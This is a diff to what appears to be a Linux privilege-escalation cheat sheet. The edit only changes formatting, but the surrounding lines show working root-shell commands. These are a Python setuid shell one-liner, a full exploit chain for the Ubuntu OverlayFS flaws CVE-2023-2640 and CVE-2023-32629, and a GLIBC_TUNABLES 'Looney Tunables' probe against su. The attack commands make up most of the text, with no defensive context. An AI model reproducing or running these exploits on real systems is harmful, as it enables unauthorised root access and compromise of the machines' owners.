@@ -129,6 +129,7 @@ python -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```bash
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
+
 Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629):
 
 ```bash
@@ -136,8 +137,10 @@ Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629):
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash -i")'
 ```
 
-Check for looney tunables
+Check for looney tunables:
+----
 #priv-esc-linux
+
 ```bash
 env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" "Z=`printf '%08192x' 1`" /usr/bin/su --help
 ```
